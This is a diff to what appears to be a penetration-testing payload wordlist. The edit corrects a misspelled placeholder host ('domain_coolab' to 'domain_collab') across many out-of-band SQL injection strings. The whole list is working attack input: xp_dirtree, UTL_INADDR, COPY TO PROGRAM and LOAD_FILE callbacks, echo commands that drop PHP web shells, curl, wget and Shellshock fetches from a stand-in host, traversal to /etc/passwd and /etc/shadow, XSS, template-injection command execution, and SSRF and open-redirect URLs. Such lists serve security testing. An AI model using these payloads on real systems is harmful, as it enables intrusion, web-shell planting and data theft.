@@ -7103,9 +7103,9 @@ echo "<?php system($_GET['cmd']); ?>" > cmd.php
 /..\../..\../..\../..\../..\../..\../etc/passwd
 /..\../..\../..\../..\../..\../..\../etc/shadow
 exec%20master..xp_dirtree%20'//domain_collab/a'
-" exec master..xp_dirtree '//domain_coolab/a'--
-' exec master..xp_dirtree '//domain_coolab/a'--
-` exec master..xp_dirtree '//domain_coolab/a'--
+" exec master..xp_dirtree '//domain_collab/a'--
+' exec master..xp_dirtree '//domain_collab/a'--
+` exec master..xp_dirtree '//domain_collab/a'--
 https://%5cwww.google.com@google.com
 https://:@google.com\@www.google.com
 https://google.com/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
@@ -7156,15 +7156,15 @@ curl https://domain_collab/.testing/rce_vuln.txt
 " exec master..xp_dirtree '//domain_collab/a'-- 
 ' exec master..xp_dirtree '//domain_collab/a'-- 
 ` exec master..xp_dirtree '//domain_collab/a'-- 
-") exec master..xp_dirtree '//domain_coolab/a'--
-"; exec master..xp_dirtree '//domain_coolab/a'--
-"||exec master..xp_dirtree '//domain_coolab/a'--
-') exec master..xp_dirtree '//domain_coolab/a'--
-'; exec master..xp_dirtree '//domain_coolab/a'--
-'||exec master..xp_dirtree '//domain_coolab/a'--
-`) exec master..xp_dirtree '//domain_coolab/a'--
-`; exec master..xp_dirtree '//domain_coolab/a'--
-`||exec master..xp_dirtree '//domain_coolab/a'--
+") exec master..xp_dirtree '//domain_collab/a'--
+"; exec master..xp_dirtree '//domain_collab/a'--
+"||exec master..xp_dirtree '//domain_collab/a'--
+') exec master..xp_dirtree '//domain_collab/a'--
+'; exec master..xp_dirtree '//domain_collab/a'--
+'||exec master..xp_dirtree '//domain_collab/a'--
+`) exec master..xp_dirtree '//domain_collab/a'--
+`; exec master..xp_dirtree '//domain_collab/a'--
+`||exec master..xp_dirtree '//domain_collab/a'--
 http://google.com:80#@www.google.com/
 http://google.com:80?@www.google.com/
 https://%09/www.google.com@google.com
@@ -7177,7 +7177,7 @@ http://www.google.com@472.314.470.462
 <!--[if]><script>javascript:alert(1)</script -->
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
-OR exec master..xp_dirtree '//domain_coolab/a'--
+OR exec master..xp_dirtree '//domain_collab/a'--
 "`'><script>\xC2\x85javascript:alert(1)</script>
 "`'><script>\xC2\xA0javascript:alert(1)</script>
 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
@@ -7220,7 +7220,7 @@ wget https://domain_collab/.testing/rce_vuln.txt
 ..%5c..%5c..%5c..%5c..%5c..%5cboot.ini;index.html
 ..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
  and 1=( if((load_file(char(110,46,101,120,11 ...
-AND exec master..xp_dirtree '//domain_coolab/a'--
+AND exec master..xp_dirtree '//domain_collab/a'--
 ; begin declare @var varchar(8000) set @var=' ...
 /..../..../..../..../..../..../..../..../boot.ini
 /....\....\....\....\....\....\....\....\boot.ini
@@ -7257,9 +7257,9 @@ echo "<?php include($_GET['page']); ?>" > rfi.php
 `) exec master..xp_dirtree '//domain_collab/a'-- 
 `; exec master..xp_dirtree '//domain_collab/a'-- 
 `||exec master..xp_dirtree '//domain_collab/a'-- 
-")) exec master..xp_dirtree '//domain_coolab/a'--
-')) exec master..xp_dirtree '//domain_coolab/a'--
-`)) exec master..xp_dirtree '//domain_coolab/a'--
+")) exec master..xp_dirtree '//domain_collab/a'--
+')) exec master..xp_dirtree '//domain_collab/a'--
+`)) exec master..xp_dirtree '//domain_collab/a'--
 ' exec sp_addsrvrolemember 'name' , 'sysadmin' --
 http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
 http://3H6k7lIAiqjfNeN@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
@@ -7363,9 +7363,9 @@ http://XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐ�
 http://XY>.7d8T\205pZM@google.com@google.com/
 ?id=1 and substring(version(),1,1) between 3 and 4
 ../../../../../../../../../../../../localstart.asp
-" OR exec master..xp_dirtree '//domain_coolab/a'--
-' OR exec master..xp_dirtree '//domain_coolab/a'--
-` OR exec master..xp_dirtree '//domain_coolab/a'--
+" OR exec master..xp_dirtree '//domain_collab/a'--
+' OR exec master..xp_dirtree '//domain_collab/a'--
+` OR exec master..xp_dirtree '//domain_collab/a'--
 /Program Files\Apache Group\Apache\conf\httpd.conf
 \Program Files\Apache Group\Apache\conf\httpd.conf
 /Program Files\Apache Group\Apache\logs\access.log
@@ -7404,9 +7404,9 @@ http://XY>.7d8T\205pZM@google.com@google.com/
 ..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00index.html
 ..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
 %68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
-" AND exec master..xp_dirtree '//domain_coolab/a'--
-' AND exec master..xp_dirtree '//domain_coolab/a'--
-` AND exec master..xp_dirtree '//domain_coolab/a'--
+" AND exec master..xp_dirtree '//domain_collab/a'--
+' AND exec master..xp_dirtree '//domain_collab/a'--
+` AND exec master..xp_dirtree '//domain_collab/a'--
 /.//..//.//..//.//..//.//..//.//..//.//..//boot.ini
 /./\/././\/././\/././\/././\/././\/././\/./boot.ini
 /.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini
@@ -7466,9 +7466,9 @@ ogg://0://srff2.domain_collab;http://google.com:80/
 " OR exec master..xp_dirtree '//domain_collab/a'-- 
 ' OR exec master..xp_dirtree '//domain_collab/a'-- 
 ` OR exec master..xp_dirtree '//domain_collab/a'-- 
-") OR exec master..xp_dirtree '//domain_coolab/a'--
-') OR exec master..xp_dirtree '//domain_coolab/a'--
-`) OR exec master..xp_dirtree '//domain_coolab/a'--
+") OR exec master..xp_dirtree '//domain_collab/a'--
+') OR exec master..xp_dirtree '//domain_collab/a'--
+`) OR exec master..xp_dirtree '//domain_collab/a'--
 /Program Files\Apache Group\Apache2\conf\httpd.conf
 \Program Files\Apache Group\Apache2\conf\httpd.conf
 rar://0://srff2.domain_collab;http://google.com:80/
@@ -7507,9 +7507,9 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 " AND exec master..xp_dirtree '//domain_collab/a'-- 
 ' AND exec master..xp_dirtree '//domain_collab/a'-- 
 ` AND exec master..xp_dirtree '//domain_collab/a'-- 
-") AND exec master..xp_dirtree '//domain_coolab/a'--
-') AND exec master..xp_dirtree '//domain_coolab/a'--
-`) AND exec master..xp_dirtree '//domain_coolab/a'--
+") AND exec master..xp_dirtree '//domain_collab/a'--
+') AND exec master..xp_dirtree '//domain_collab/a'--
+`) AND exec master..xp_dirtree '//domain_collab/a'--
 C:/program files/apachegroup/apache2/conf/httpd.conf
 C:/program files/apache group/apache/conf/httpd.conf
 C:\Program Files\Apache Group\Apache\conf\httpd.conf
@@ -7532,9 +7532,9 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 ") OR exec master..xp_dirtree '//domain_collab/a'-- 
 ') OR exec master..xp_dirtree '//domain_collab/a'-- 
 `) OR exec master..xp_dirtree '//domain_collab/a'-- 
-")) OR exec master..xp_dirtree '//domain_coolab/a'--
-')) OR exec master..xp_dirtree '//domain_coolab/a'--
-`)) OR exec master..xp_dirtree '//domain_coolab/a'--
+")) OR exec master..xp_dirtree '//domain_collab/a'--
+')) OR exec master..xp_dirtree '//domain_collab/a'--
+`)) OR exec master..xp_dirtree '//domain_collab/a'--
 phar://0://srff2.domain_collab;http://google.com:80/
 /Program Files\Apache Group\Apache\logs\error.log%00
 "`'><script>\xE1\x9A\x80javascript:alert(1)</script>
@@ -7602,9 +7602,9 @@ $(`wget https://domain_collab/.testing/rce_vuln.txt`)
 ") AND exec master..xp_dirtree '//domain_collab/a'-- 
 ') AND exec master..xp_dirtree '//domain_collab/a'-- 
 `) AND exec master..xp_dirtree '//domain_collab/a'-- 
-")) AND exec master..xp_dirtree '//domain_coolab/a'--
-')) AND exec master..xp_dirtree '//domain_coolab/a'--
-`)) AND exec master..xp_dirtree '//domain_coolab/a'--
+")) AND exec master..xp_dirtree '//domain_collab/a'--
+')) AND exec master..xp_dirtree '//domain_collab/a'--
+`)) AND exec master..xp_dirtree '//domain_collab/a'--
 () { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
 () { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
 () { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
@@ -7724,8 +7724,8 @@ C:/program files/xampp/apache/conf/httpd.confetc/passwd
 http://3H6k7lIAiqjfNeN@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 http://XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 <img src="x` `<script>javascript:alert(1)</script>"` `>
-" SELECT UTL_INADDR.get_host_address('domain_coolab')--
-` SELECT UTL_INADDR.get_host_address('domain_coolab')--
+" SELECT UTL_INADDR.get_host_address('domain_collab')--
+` SELECT UTL_INADDR.get_host_address('domain_collab')--
 /%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
 /%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
 /Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php%00
@@ -7787,9 +7787,9 @@ ABC<div style="x:\x20expression(javascript:alert(1)">DEF
 ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cboot.ini
 ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afboot.ini
 ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cboot.ini
-" copy (SELECT '') to program 'nslookup domain_coolab'--
-' copy (SELECT '') to program 'nslookup domain_coolab'--
-` copy (SELECT '') to program 'nslookup domain_coolab'--
+" copy (SELECT '') to program 'nslookup domain_collab'--
+' copy (SELECT '') to program 'nslookup domain_collab'--
+` copy (SELECT '') to program 'nslookup domain_collab'--
 dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
 & echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
 && echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
@@ -7801,19 +7801,19 @@ http://www.google.com@[::ffff:216.58.214.206]
 ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
-OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
+OR SELECT UTL_INADDR.get_host_address('domain_collab')--
 "`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
 " SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ` SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-") SELECT UTL_INADDR.get_host_address('domain_coolab')--
-"; SELECT UTL_INADDR.get_host_address('domain_coolab')--
-"||SELECT UTL_INADDR.get_host_address('domain_coolab')--
-') SELECT UTL_INADDR.get_host_address('domain_coolab')--
-'; SELECT UTL_INADDR.get_host_address('domain_coolab')--
-'||SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`) SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`; SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`||SELECT UTL_INADDR.get_host_address('domain_coolab')--
+") SELECT UTL_INADDR.get_host_address('domain_collab')--
+"; SELECT UTL_INADDR.get_host_address('domain_collab')--
+"||SELECT UTL_INADDR.get_host_address('domain_collab')--
+') SELECT UTL_INADDR.get_host_address('domain_collab')--
+'; SELECT UTL_INADDR.get_host_address('domain_collab')--
+'||SELECT UTL_INADDR.get_host_address('domain_collab')--
+`) SELECT UTL_INADDR.get_host_address('domain_collab')--
+`; SELECT UTL_INADDR.get_host_address('domain_collab')--
+`||SELECT UTL_INADDR.get_host_address('domain_collab')--
 ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215boot.ini
 ..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216boot.ini
 ..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini
@@ -7851,7 +7851,7 @@ OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
 ..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log
 %5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd;index.html
-AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
+AND SELECT UTL_INADDR.get_host_address('domain_collab')--
 .//..//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini
 /..././..././..././..././..././..././..././..././boot.ini
@@ -7868,15 +7868,15 @@ AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
 " copy (SELECT '') to program 'nslookup domain_collab'-- 
 ' copy (SELECT '') to program 'nslookup domain_collab'-- 
 ` copy (SELECT '') to program 'nslookup domain_collab'-- 
-") copy (SELECT '') to program 'nslookup domain_coolab'--
-"; copy (SELECT '') to program 'nslookup domain_coolab'--
-"||copy (SELECT '') to program 'nslookup domain_coolab'--
-') copy (SELECT '') to program 'nslookup domain_coolab'--
-'; copy (SELECT '') to program 'nslookup domain_coolab'--
-'||copy (SELECT '') to program 'nslookup domain_coolab'--
-`) copy (SELECT '') to program 'nslookup domain_coolab'--
-`; copy (SELECT '') to program 'nslookup domain_coolab'--
-`||copy (SELECT '') to program 'nslookup domain_coolab'--
+") copy (SELECT '') to program 'nslookup domain_collab'--
+"; copy (SELECT '') to program 'nslookup domain_collab'--
+"||copy (SELECT '') to program 'nslookup domain_collab'--
+') copy (SELECT '') to program 'nslookup domain_collab'--
+'; copy (SELECT '') to program 'nslookup domain_collab'--
+'||copy (SELECT '') to program 'nslookup domain_collab'--
+`) copy (SELECT '') to program 'nslookup domain_collab'--
+`; copy (SELECT '') to program 'nslookup domain_collab'--
+`||copy (SELECT '') to program 'nslookup domain_collab'--
 C:/program files/mysql/mysql server 5.0/data/hostname.err
 C:/program files (x86)/apache group/apache/conf/error.log
 C:/windows/system32/inetsrv/config/applicationhost.config
@@ -7886,7 +7886,7 @@ C:/windows/system32/inetsrv/config/applicationhost.config
 https://www.google.com/https://www.google.com/
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 javascript://%250Alert(document.location=document.cookie)
-OR copy (SELECT '') to program 'nslookup domain_coolab'--
+OR copy (SELECT '') to program 'nslookup domain_collab'--
 OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ") SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 "; SELECT UTL_INADDR.get_host_address('domain_collab')-- 
@@ -7897,9 +7897,9 @@ OR SELECT UTL_INADDR.get_host_address('domain_collab')--
 `) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 `; SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 `||SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-")) SELECT UTL_INADDR.get_host_address('domain_coolab')--
-')) SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`)) SELECT UTL_INADDR.get_host_address('domain_coolab')--
+")) SELECT UTL_INADDR.get_host_address('domain_collab')--
+')) SELECT UTL_INADDR.get_host_address('domain_collab')--
+`)) SELECT UTL_INADDR.get_host_address('domain_collab')--
 /..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215boot.ini
 /..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215
 /..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216boot.ini
@@ -7919,7 +7919,7 @@ OR SELECT UTL_INADDR.get_host_address('domain_collab')--
 /\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c
 %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd;index.html
 ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
-AND copy (SELECT '') to program 'nslookup domain_coolab'--
+AND copy (SELECT '') to program 'nslookup domain_collab'--
 AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 /.//..//.//..//.//..//.//..//.//..//.//..//.//..//boot.ini
 /.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini
@@ -7932,9 +7932,9 @@ AND SELECT UTL_INADDR.get_host_address('domain_collab')--
 `) copy (SELECT '') to program 'nslookup domain_collab'-- 
 `; copy (SELECT '') to program 'nslookup domain_collab'-- 
 `||copy (SELECT '') to program 'nslookup domain_collab'-- 
-")) copy (SELECT '') to program 'nslookup domain_coolab'--
-')) copy (SELECT '') to program 'nslookup domain_coolab'--
-`)) copy (SELECT '') to program 'nslookup domain_coolab'--
+")) copy (SELECT '') to program 'nslookup domain_collab'--
+')) copy (SELECT '') to program 'nslookup domain_collab'--
+`)) copy (SELECT '') to program 'nslookup domain_collab'--
 C:/program files/mysql/mysql server 5.0/data/mysql-bin.log
 C:/program files (x86)/apache group/apache/conf/access.log
 C:/program files (x86)/apache group/apache/conf/httpd.conf
@@ -7945,9 +7945,9 @@ https://www.google.com@www.google.com/%2e%2e%2f
 https://www.google.com@www.google.com/%2f%2e%2e
 http://google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@google.com/
 OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-" OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-' OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-` OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
+" OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+' OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+` OR SELECT UTL_INADDR.get_host_address('domain_collab')--
 ")) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ')) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 `)) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
@@ -7980,9 +7980,9 @@ ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini;index.html
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
 AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-" AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-' AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-` AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
+" AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+' AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+` AND SELECT UTL_INADDR.get_host_address('domain_collab')--
 {{app.request.query.filter(0,0,1024,{'options':'system'})}}
 ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd
 ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c/etc/passwd
@@ -8002,15 +8002,15 @@ https:///www.google.com@www.google.com/%2f%2e%2e
 http:www.google.com@00330.00072.0000326.00000316
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-" OR copy (SELECT '') to program 'nslookup domain_coolab'--
-' OR copy (SELECT '') to program 'nslookup domain_coolab'--
-` OR copy (SELECT '') to program 'nslookup domain_coolab'--
+" OR copy (SELECT '') to program 'nslookup domain_collab'--
+' OR copy (SELECT '') to program 'nslookup domain_collab'--
+` OR copy (SELECT '') to program 'nslookup domain_collab'--
 " OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ' OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ` OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-") OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-') OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`) OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
+") OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+') OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+`) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
 system('curl https://domain_collab/.testing/rce_vuln.txt');
 system('wget https://domain_collab/.testing/rce_vuln.txt');
 ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215/etc/passwd
@@ -8024,15 +8024,15 @@ system('wget https://domain_collab/.testing/rce_vuln.txt');
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
 %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
 ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
-" AND copy (SELECT '') to program 'nslookup domain_coolab'--
-' AND copy (SELECT '') to program 'nslookup domain_coolab'--
-` AND copy (SELECT '') to program 'nslookup domain_coolab'--
+" AND copy (SELECT '') to program 'nslookup domain_collab'--
+' AND copy (SELECT '') to program 'nslookup domain_collab'--
+` AND copy (SELECT '') to program 'nslookup domain_collab'--
 " AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ' AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ` AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-") AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-') AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`) AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
+") AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+') AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+`) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
 /..././..././..././..././..././..././..././..././boot.ini%00
 %c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
 %c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
@@ -8049,21 +8049,21 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 " OR copy (SELECT '') to program 'nslookup domain_collab'-- 
 ' OR copy (SELECT '') to program 'nslookup domain_collab'-- 
 ` OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-") OR copy (SELECT '') to program 'nslookup domain_coolab'--
-') OR copy (SELECT '') to program 'nslookup domain_coolab'--
-`) OR copy (SELECT '') to program 'nslookup domain_coolab'--
+") OR copy (SELECT '') to program 'nslookup domain_collab'--
+') OR copy (SELECT '') to program 'nslookup domain_collab'--
+`) OR copy (SELECT '') to program 'nslookup domain_collab'--
 ") OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ') OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 `) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-")) OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-')) OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`)) OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
+")) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+')) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+`)) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
 "SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
 %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini
 %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini
-"UNION SELECT UTL_INADDR.get_host_address('domain_coolab')--
-'UNION SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`UNION SELECT UTL_INADDR.get_host_address('domain_coolab')--
+"UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
+'UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
+`UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
 () { :;}; wget http://vps_ip/.testing/shellshock.txt?vuln=11
 בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f
@@ -8085,15 +8085,15 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 " AND copy (SELECT '') to program 'nslookup domain_collab'-- 
 ' AND copy (SELECT '') to program 'nslookup domain_collab'-- 
 ` AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-") AND copy (SELECT '') to program 'nslookup domain_coolab'--
-') AND copy (SELECT '') to program 'nslookup domain_coolab'--
-`) AND copy (SELECT '') to program 'nslookup domain_coolab'--
+") AND copy (SELECT '') to program 'nslookup domain_collab'--
+') AND copy (SELECT '') to program 'nslookup domain_collab'--
+`) AND copy (SELECT '') to program 'nslookup domain_collab'--
 ") AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ') AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 `) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
-")) AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-')) AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`)) AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
+")) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+')) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+`)) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
 /%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
 /%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini
@@ -8104,9 +8104,9 @@ http://www.google.com@00330.00072.0000326.00000316
 ") OR copy (SELECT '') to program 'nslookup domain_collab'-- 
 ') OR copy (SELECT '') to program 'nslookup domain_collab'-- 
 `) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
-")) OR copy (SELECT '') to program 'nslookup domain_coolab'--
-')) OR copy (SELECT '') to program 'nslookup domain_coolab'--
-`)) OR copy (SELECT '') to program 'nslookup domain_coolab'--
+")) OR copy (SELECT '') to program 'nslookup domain_collab'--
+')) OR copy (SELECT '') to program 'nslookup domain_collab'--
+`)) OR copy (SELECT '') to program 'nslookup domain_collab'--
 ")) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ')) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 `)) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
@@ -8131,9 +8131,9 @@ http://www.google.com@00330.00072.0000326.00000316
 ") AND copy (SELECT '') to program 'nslookup domain_collab'-- 
 ') AND copy (SELECT '') to program 'nslookup domain_collab'-- 
 `) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
-")) AND copy (SELECT '') to program 'nslookup domain_coolab'--
-')) AND copy (SELECT '') to program 'nslookup domain_coolab'--
-`)) AND copy (SELECT '') to program 'nslookup domain_coolab'--
+")) AND copy (SELECT '') to program 'nslookup domain_collab'--
+')) AND copy (SELECT '') to program 'nslookup domain_collab'--
+`)) AND copy (SELECT '') to program 'nslookup domain_collab'--
 ")) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 ')) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 `)) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
@@ -8798,9 +8798,9 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 /%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
 %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
 /%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc/passwd
-" LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-' LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-` LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+" LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215/etc/passwd
